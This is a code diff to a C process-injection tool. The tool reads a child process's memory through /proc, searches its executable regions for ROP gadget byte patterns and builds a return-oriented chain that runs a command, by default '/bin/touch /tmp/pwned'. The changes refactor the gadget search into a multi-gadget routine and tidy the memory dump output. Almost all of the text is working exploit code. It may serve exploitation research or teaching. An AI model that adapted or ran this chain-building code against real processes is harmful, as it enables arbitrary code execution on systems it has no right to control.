@@ -13,6 +13,12 @@ char* COMMAND = "/bin/touch /tmp/pwned";
 
 #define MAX_LOOPS 100
 
+typedef struct {
+    const uint8_t  *bytes;
+    size_t          len;
+    uint64_t        addr;
+} Gadget;
+
 pid_t create_victim_child_process() {
     pid_t pid = fork();
     if (pid < 0) {
@@ -22,7 +28,7 @@ pid_t create_victim_child_process() {
         sleep(2);
         exit(0);
     }
-    sleep(0.1);
+    sleep(0.2);
     return pid;
 }
 
@@ -66,11 +72,17 @@ int read_mem(void *buf, pid_t pid, uintptr_t address, size_t len) {
 }
 
 void print_mem(unsigned char* buffer, long size) {
-    for(int i=0;i<size;i++) {
-        printf("%02x ", buffer[i]);
-        if (i % 8 == 7) printf("\n");
+    for (size_t i = 0; i < size; i += 16) {
+        printf("%06zx  ", i);
+        for (size_t j = 0; j < 16; j++) {
+            if (i + j < size)
+                printf("%02x ", buffer[i + j]);
+            else
+                printf("   ");
+            if (j == 7) printf(" ");
+        }
+        printf("\n");
     }
-    printf("\n");
 }
 
 long get_reg(pid_t pid, const char* reg) {
@@ -239,7 +251,7 @@ char** cmd_to_argv(const char* raw_cmd, int *out_argc) {
     return argv;
 }
 
-long find_gadget(int pid, const unsigned char *gadget, size_t gadget_len, const char req_perm) {
+long find_gadgets(int pid, Gadget *gadgets, int num_gadgets) {
     char maps_path[256];
     char mem_path[256];
     
@@ -256,7 +268,7 @@ long find_gadget(int pid, const unsigned char *gadget, size_t gadget_len, const 
     }
 
     char line[512];
-    long found_addr = -1;
+    long found = 0;
 
     // read the memory
     while (fgets(line, sizeof(line), maps_file)) {
@@ -268,45 +280,57 @@ long find_gadget(int pid, const unsigned char *gadget, size_t gadget_len, const 
             continue;
         
         //has the region execute permission?
-        if (req_perm == 'x' && perms[2] != 'x')
+        if (perms[2] != 'x')
             continue;
 
         size_t size = end - start;
         unsigned char *buffer = malloc(size);
         if (!buffer) continue;
-        
-        if (pread(mem_fd, buffer, size, start) != (ssize_t)size)
-            continue;
-        // memmem is the strstr for memory regions
-        unsigned char *match = memmem(buffer, size, gadget, gadget_len);
-        
-        if (match) { // Gadget found
-            found_addr = start + (match - buffer);
+        if (pread(mem_fd, buffer, size, start) != (ssize_t)size) {
             free(buffer);
-            break; 
+            continue;
+        }
+
+        for (int i = 0; i < num_gadgets; i++) {
+            if (gadgets[i].addr != 0) continue;
+            unsigned char *match = memmem(buffer, size, gadgets[i].bytes, gadgets[i].len);
+            if (match) {
+                gadgets[i].addr = start + (match - buffer);
+                found++;
+            }
         }
         free(buffer);
+        if (found == num_gadgets) break;
     }
+
     fclose(maps_file);
     close(mem_fd);
-    return found_addr;
+    return found;
 }
 
 uint64_t* build_rop_chain_exec_cmd(pid_t pid, int* out_rop_chain_size, char* const cmd_argv[], int cmd_argc) {
-    uint64_t pop_rdi_ret = find_gadget(pid, (const unsigned char *) "\x5f\xc3", 2, 'x');     // pop rdi; ret
-    uint64_t pop_rsi_ret = find_gadget(pid, (const unsigned char *) "\x5e\xc3", 2, 'x');     // pop rsi; ret
-    uint64_t pop_rdx_ret = find_gadget(pid, (const unsigned char *) "\x5a\xc3", 2, 'x');     // pop rdx; ret
-    uint64_t pop_rax_ret = find_gadget(pid, (const unsigned char *) "\x58\xc3", 2, 'x');     // pop rax; ret
-    uint64_t syscall_ret = find_gadget(pid, (const unsigned char *) "\x0f\x05\xc3", 3, 'x'); // syscall; ret
-    uint64_t mov_mem_rdi_rax_ret = find_gadget(pid, (const unsigned char *) "\x48\x89\x07\xc3", 4, 'x'); // mov [rdi], rax; ret
+    Gadget gadgets[] = {
+        { (uint8_t*)"\x5f\xc3",         2, 0 }, // pop rdi; ret
+        { (uint8_t*)"\x5e\xc3",         2, 0 }, // pop rsi; ret
+        { (uint8_t*)"\x5a\xc3",         2, 0 }, // pop rdx; ret
+        { (uint8_t*)"\x58\xc3",         2, 0 }, // pop rax; ret
+        { (uint8_t*)"\x0f\x05\xc3",     3, 0 }, // syscall; ret
+        { (uint8_t*)"\x48\x89\x07\xc3", 4, 0 }, // mov [rdi], rax; ret
+    };
+    int n = sizeof(gadgets) / sizeof(gadgets[0]);
 
-    if (pop_rdi_ret         == (uint64_t)-1 ||
-        pop_rsi_ret         == (uint64_t)-1 ||
-        pop_rdx_ret         == (uint64_t)-1 ||
-        pop_rax_ret         == (uint64_t)-1 ||
-        syscall_ret         == (uint64_t)-1 ||
-        mov_mem_rdi_rax_ret == (uint64_t)-1 )
+    int found = find_gadgets(pid, gadgets, n);
+    if (found < n) {
+        fprintf(stderr, "[-] Not all gadgets found (%d/%d)\n", found, n);
         return NULL;
+    }
+
+    uint64_t pop_rdi_ret = gadgets[0].addr;
+    uint64_t pop_rsi_ret = gadgets[1].addr;
+    uint64_t pop_rdx_ret = gadgets[2].addr;
+    uint64_t pop_rax_ret = gadgets[3].addr;
+    uint64_t syscall_ret = gadgets[4].addr;
+    uint64_t mov_mem_rdi_rax_ret = gadgets[5].addr;
 
     printf("[*] All gadgets found\n");
 
@@ -333,7 +357,7 @@ uint64_t* build_rop_chain_exec_cmd(pid_t pid, int* out_rop_chain_size, char* con
     long writable_region = find_memory_region(pid, bytes_to_write, "w");
     if(writable_region == -1) return NULL;
     writable_region = (writable_region + 7) & ~7; // alligment
-    printf("[*] Place to write arguments and array: 0x%lx (Size: %d bytes)\n", writable_region, bytes_to_write);
+    printf("[+] Place to write arguments and array: 0x%lx (Size: %d bytes)\n", writable_region, bytes_to_write);
 
     // rop_chain allocation
     int rop_chain_len = num_chunks * 5 +    // 5 gadget to write 8 bytes
